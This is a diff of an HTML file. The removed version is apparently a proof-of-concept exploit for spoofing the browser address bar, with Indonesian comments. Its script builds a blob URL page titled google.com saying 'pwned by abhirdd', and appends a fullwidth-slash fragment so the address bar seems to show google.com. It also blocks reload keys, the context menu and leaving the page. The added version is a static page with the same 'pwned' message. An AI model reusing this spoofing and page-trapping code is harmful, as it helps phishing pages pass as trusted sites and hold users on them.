@@ -3,72 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC: Display Spoof Max</title>
+<title>google.com</title>
 <style>
-  body { margin:0; min-height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; gap:12px; }
-  h1 { font-size:1.1rem; font-weight:500; opacity:0.8; margin:0; }
-  pre { text-align:left; font-size:0.7rem; color:#0f0; max-width:90vw; white-space:pre-wrap; }
+  body { margin:0; height:100vh; display:flex; align-items:center; justify-content:center; background:#ffffff; color:#000000; font-family:Arial,Helvetica,sans-serif; }
+  h1 { font-weight:normal; font-size:3rem; margin:0; }
 </style>
 </head>
 <body>
-
-  <h1>Committing max display-spoof blob URL...</h1>
-  <pre id="log"></pre>
-
-  <script>
-    (function () {
-      var logEl = document.getElementById('log');
-      var log = function (m) { logEl.textContent += m + '\n'; console.log(m); };
-
-      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);
-
-      // Fragment display-spoof (dipakai di kedua jalur): google.com + pwned.
-
-
-      var payload =
-        '<!DOCTYPE html><html><head><meta charset="utf-8"><title>google.com</title></head>' +
-        '<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#ffffff;color:#000000;font-family:Arial,Helvetica,sans-serif;">' +
-        '<h1 style="font-weight:normal;font-size:3rem;margin:0;">pwned by abhirdd</h1>' +
-        '<scr' + 'ipt>' +
-        'window.addEventListener("keydown",function(e){' +
-        'if(e.key==="F5"||((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==="r")){e.preventDefault();e.stopPropagation();}},true);' +
-        'window.addEventListener("beforeunload",function(e){e.preventDefault();e.returnValue="x";});' +
-        'window.addEventListener("contextmenu",function(e){e.preventDefault();});' +
-        '<\/scr' + 'ipt></body></html>';
-
-      function makeUrl() {
-        return URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
-      }
-
-      // Fragment (#): google.com + pwned jadi FRAGMENT (bukan path), sehingga
-      // blob canonical tetap ke-resolve -> halaman "pwned abhirdd" TAMPIL.
-      var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
-
-      // Catatan penting (ditemukan via eksperimen):
-      //  - file:// : Chrome match blob URL EXACT-STRING -> hanya canonical
-      //              "blob:null/<uuid>" yang LOAD.
-      //  - https   : path-spoof ("/google.com/<uuid>") tampil di address bar
-      //              tapi halaman-nya ERR_FILE_NOT_FOUND. Yang PASTI LOAD
-      //              hanya canonical "blob:<origin>/<uuid>".
-      // Karena itu kedua jalur pakai canonical + fragment agar halaman
-      // "pwned by abhirdd" benar-benar tampil.
-
-      if (location.protocol === 'file:' || location.origin === 'null') {
-        var uf = makeUrl();
-        log('[main] mode file:// -> canonical blob:null + fragment');
-        log('[main] target: ' + uf + FRAGMENT);
-        location.replace(uf + FRAGMENT);
-        return;
-      }
-
-      setTimeout(function () {
-        var u = makeUrl();
-        log('[main] mode https -> canonical blob + fragment');
-        log('[main] target: ' + u + FRAGMENT);
-        location.replace(u + FRAGMENT);
-      }, 1200);
-    })();
-  </script>
-
+  <h1>pwned by abhirdd</h1>
 </body>
 </html>
